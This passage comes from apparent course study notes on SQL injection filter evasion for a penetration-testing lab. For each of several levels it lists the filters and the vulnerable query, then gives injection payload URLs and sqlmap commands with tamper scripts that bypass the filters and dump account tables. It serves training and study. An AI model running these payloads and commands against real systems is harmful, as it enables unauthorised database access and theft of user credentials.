&#x27;http://192.222.62.2/upload.php?lab=4&amp;payload=&#x27; -p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 --banner --flush-session --regexp=&#x27;99\sviews&#x27;  --prefix=&quot;01.jpg&#x27;&quot;
+</code></pre><h3 id="e14f4daf-01c0-4ba9-b02d-acef6d1987a4" class=""><strong>1 - ENTRY LEVEL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#1---entry-level"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7af3edfd-a648-4d52-97a9-02ccc280a488" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># Query:
+$query = &quot;SELECT views from attachments where filename=&#x27;$filename&#x27;&quot;;
+
+
+# PoC
+http://hacker.site/2nd/view.php?payload=%27%20union%20select%20@@version;%20--%20-
+
+# SQLMAP
+./sqlmap.py -u &#x27;http://hacker.site/2nd/view.php?payload=a&#x27; --technique=U --suffix=&#x27;; -- -&#x27; --banner
+
+./sqlmap.py -u &#x27;http://hacker.site/2nd/view.php?payload=a&#x27; --technique=U --suffix=&#x27;; -- -&#x27; -D selfie4you01 -T accounts --dump --no-cast
+</code></pre><h3 id="f4dc567d-e9ea-4c8d-8a2d-63929f3ebddc" class=""><strong>2 - UNION SELECT</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#2---union-select"></a></strong></h3><ul id="a4432356-65a8-4bef-ad56-1ea35792306a" class="bulleted-list"><li style="list-style-type:disc">no filters</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="de8f3112-9fb4-4a79-a6ae-b2336eda2bea" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Filters: none
+
+Query:
+$query = &quot;SELECT views FROM attachments where filename=&#x27;$entry&#x27;;&quot;;
+
+
+# PoC
+http://hacker.site/2nd/upload.php?lab=2&amp;payload=&#x27;+union+select+@@version;%23
+
+# SQLMAP
+./sqlmap.py -u &quot;http://hacker.site/2nd/upload.php?lab=2&amp;payload=_&quot; -p payload --technique=U --suffix=&#x27;;#&#x27; --union-col=1 --dbms MySQL --banner --no-cast
+
+./sqlmap.py -u &quot;http://hacker.site/2nd/upload.php?lab=2&amp;payload=_&quot; -p payload --technique=U --suffix=&#x27;;#&#x27; --union-col=1 --dbms MySQL -D selfie4you02 -T accounts --dump --no-cast
+
+</code></pre><h3 id="74972968-c8d3-4100-b3ac-023d972fd32a" class=""><strong>3 - UNION SELECT</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#3---union-select"></a></strong></h3><ul id="c0da0dd9-74d5-437d-b427-ebe4332b751a" class="bulleted-list"><li style="list-style-type:disc">randomcase filter</li></ul><ul id="2e19389e-eb46-4413-abeb-69fee5077574" class="bulleted-list"><li style="list-style-type:disc">union-char it’s not required here</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c1ae119b-5938-41d9-8d95-8ab7d6866fa8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Filters:
+/UNION/
+/SELECT/
+
+Query:
+$query = &quot;SELECT views FROM attachments where filename=&#x27;$entry&#x27;;&quot;;
+
+
+# PoC
+http://hacker.site/2nd/upload.php?lab=3&amp;payload=a%27%20UNIoN%20SeLECT%20%27PoC%20String%27;%20--%20-
+
+# SQLMAP
+
+./sqlmap.py -u &#x27;http://hacker.site/2nd/upload.php?lab=3&amp;payload=b&#x27; \
+	-p payload --technique=U --suffix=&#x27;;#&#x27; --dbms MySQL --union-col=1 --no-cast \
+	--tamper=randomcase --banner
+
+./sqlmap.py -u &#x27;http://hacker.site/2nd/upload.php?lab=3&amp;payload=b&#x27; \
+	-p payload --technique=U --suffix=&#x27;;#&#x27; --dbms MySQL --union-col=1 --no-cast \
+	--tamper=randomcase -D selfie4you03 -T accounts --dump
+</code></pre><h3 id="f2f3baad-a272-4d42-b176-8b2e1e6a3a00" class=""><strong>4 - Boolean-based blind</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#4---boolean-based-blind"></a></strong></h3><ul id="1ad2c72d-597f-4ee5-98b8-7503b156ff3c" class="bulleted-list"><li style="list-style-type:disc">UNION filtered out</li></ul><ul id="b64480ec-2405-4b4e-be66-4cc3a2c7bcc0" class="bulleted-list"><li style="list-style-type:disc">symboliclogical filter (AND &gt; &amp;&amp; , OR &gt; )</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f4bd4571-8b54-4067-b60c-edf2828f2b5a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Filters:
+/UNION/i
+/\ AND\ /i
+
+Query:
+$query = &quot;SELECT views FROM attachments where filename=&#x27;$entry&#x27;;&quot;;
+
+
+# POCs
+
+# (%26) == &amp;
+TRUE:	http://hacker.site/2nd/upload.php?lab=4&amp;payload=01.jpg&#x27;+%26%26+&#x27;123&#x27;=&#x27;123
+FALSE:	http://hacker.site/2nd/upload.php?lab=4&amp;payload=01.jpg&#x27;+%26%26+&#x27;123&#x27;=&#x27;1
+
+# using true (1) and false (0)booleans
+# (%23) == #
+TRUE:	http://hacker.site/2nd/upload.php?lab=4&amp;payload=01.jpg&#x27;+%26%26+TRUE;%23
+FALSE:	http://hacker.site/2nd/upload.php?lab=4&amp;payload=01.jpg&#x27;+%26%26+FALSE;%23
+
+
+# SQLMAP
+./sqlmap.py -u &#x27;http://hacker.site/2nd/upload.php?lab=4&amp;payload=X&#x27; \
+	-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \
+	--banner --flush-session
+
+./sqlmap.py -u &#x27;http://hacker.site/2nd/upload.php?lab=4&amp;payload=X&#x27; \
+	-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \
+	-D selfie4you04 -T accounts --dump
+
+</code></pre><h3 id="0d4d1236-3ab3-42a3-9b61-a1107cd6aea8" class=""><strong>5 - Boolean-based blind</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#5---boolean-based-blind"></a></strong></h3><ul id="94c87dcb-91c1-4527-9432-d6d65eb8d2a4" class="bulleted-list"><li style="list-style-type:disc">UNION filtered out</li></ul><ul id="2b9fc1fd-7e1e-4cb7-92e1-1bc6bc5f0676" class="bulleted-list"><li style="list-style-type:disc">symboliclogical filter (AND &gt; &amp;&amp; , OR &gt; )</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c6be9c29-d13a-45c6-8d3e-04de2908ec28" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Filters:
+/UNION/i
+/\ AND\ /i
+/\ OR\ /i
+
+Query;
+$query = &quot;SELECT views FROM attachments where filename=&#x27;$entry&#x27;;&quot;;
+
+
+POCs:
+# same as #4 but with filter that applies to OR too
+# (%7C) == |
+
+# SQLMAP
+./sqlmap.py -u &#x27;http://hacker.site/2nd/upload.php?lab=5&amp;payload=X&#x27; \
+	-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \
+	--banner --flush-session
+
+./sqlmap.py -u &#x27;http://hacker.site/2nd/upload.php?lab=5&amp;payload=X&#x27; \
+	-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \
+	-D selfie4you05 -T accounts --dump
+
+</code></pre><h3 id="a432826a-8e43-4c6d-beca-2203bf4adeb3" class=""><strong>6 - Boolean-based blind</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#6---boolean-based-blind"></a></strong></h3><ul id="7c9973df-df5a-402e-87f1-73035a7843bc" class="bulleted-list"><li style="list-style-type:disc">UNION filtered out</li></ul><ul id="e2b5f351-380c-42bb-8452-a8361a973ef0" class="bulleted-list"><li style="list-style-type:disc">symboliclogical filter (AND &gt; &amp;&amp; , OR &gt; )</li></ul><ul id="4fc018d5-2e31-4a3b-974a-fb19a97e817b" class="bulleted-list"><li style="list-style-type:disc">space to verical tab filter to bypass [space]OR filter</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a7af4dc6-b67f-4fea-ad2f-5483a6f87e79" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Filters:
+/UNION/i
+/AND/i
+/ OR/i
+
+Query;
+$query = &quot;SELECT views FROM attachments where filename=&#x27;$entry&#x27;;&quot;;
+
+# SQLMAP
+
+./sqlmap.py -u &quot;http://hacker.site/2nd/upload.php?lab=6&amp;payload=x&quot; \
+	-p payload --technique=B --dbms MySQL --suffix=&#x27;;#&#x27; --tamper=&quot;symboliclogical, space2VT.py&quot; \
+	--no-cast --threads=10 -v 3 \
+	--banner --flush-session
+
+./sqlmap.py -u &quot;http://hacker.site/2nd/upload.php?lab=6&amp;payload=x&quot; \
+	-p payload --technique=B --dbms MySQL --suffix=&#x27;;#&#x27; \
+	--tamper=&quot;symboliclogical, space2VT.py&quot; \
+	--no-cast --threads=5 -v 3 \
+	-D selfie4you06 -T accounts \
+	--columns
+</code></pre><h3 id="577cfe83-9352-4999-9b01-bbb9c90e27e1" class=""><strong>7 - Boolean-based blind</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#7---boolean-based-blind"></a></strong></h3><ul id="448b93a4-60fa-403e-b4f4-9d6107a49b28" class="bulleted-list"><li style="list-style-type:disc">UNION filtered out</li></ul><ul id="f9cfcc0d-054f-48d7-a7a8-77191c0e0d41" class="bulleted-list"><li style="list-style-type:disc">symboliclogical filter (AND &gt; &amp;&amp; , OR &gt; )</li></ul><ul id="25c3050b-0763-4f86-9a55-7e5970e5b6a7" class="bulleted-list"><li style="list-style-type:disc">space to verical tab filter to bypass [space]OR filter</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="622a63b5-2c23-4d7c-94e3-4fc02ef282d0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Filters:
+/UNION/i
+/AND/i
+/ OR/i
+/6163636f756e7473/
+/selfie4you07.accounts/
+
+Query;
+$query = &quot;SELECT views FROM attachments where filename=&#x27;$entry&#x27;;&quot;;
+
+
+# PoC
+TRUE:	http://hacker.site/2nd/upload.php?lab=7&amp;payload=01.jpg&#x27;+%26%26+TRUE;%23
+
+
+# SQLMAP
+
+./sqlmap.py -u &quot;http://hacker.site/2nd/upload.php?lab=7&amp;payload=x&quot; \
+	-p payload --technique=B --dbms MySQL --suffix=&#x27;;#&#x27; \
+	--tamper=&quot;symboliclogical, space2VT.py, accounts.py&quot; \
+	--no-cast --threads=5 -v 3 \
+	--banner --flush-session
+
+
+./sqlmap.py -u &quot;http://hacker.site/2nd/upload.php?lab=7&amp;payload=x&quot; \
+	-p payload --technique=B --dbms MySQL --suffix=&#x27;;#&#x27; \
+	--tamper=&quot;symboliclogical, space2VT.py, accounts.py&quot; \
+	--no-cast --threads=5 -v 3 \
+	-D selfie4you07 -T accounts \
+	--columns
+
+</code></pre><h3 id="0592eb93-eb1d-4339-8d65-60241ed29867" class=""><strong>BONUS LEVEL(s)</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#bonus-levels"></a></strong></h3><p id="f42ea6fe-bdb3-4191-9db6-ba47b37a26a1" class="">IN ALL LEVELS THE FILTER IS NOT RECOURSIVE</p><ul id="037af6c0-0415-4bd1-b956-5b9c28618aeb" class="bulleted-list"><li style="list-style-type:disc">To exploit it you should upload first a filename with the payload you want to execute.</li></ul><ul id="0d75a030-44d1-4a64-bf78-e8c9fed75bfc" class="bulleted-list"><li style="list-style-type:disc">This will be excluded because contains filtered words</li></ul><ul id="8b2aa6e8-ffce-40ec-a1e7-cb1e75be0c71" class="bulleted-list"><li style="list-style-type:disc">Then upload a new file with a name that bypass the redundant filter, such as <em>unUNIONnion</em>.</li></ul><ul id="c050475c-80fe-465a-9db0-d991dafb274c" class="bulleted-list"><li style="list-style-type:disc">Once <strong>purified</strong> the latest filename will be the same as the fist uploaded and thus the file exitsts and can be displayed.</li></ul></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
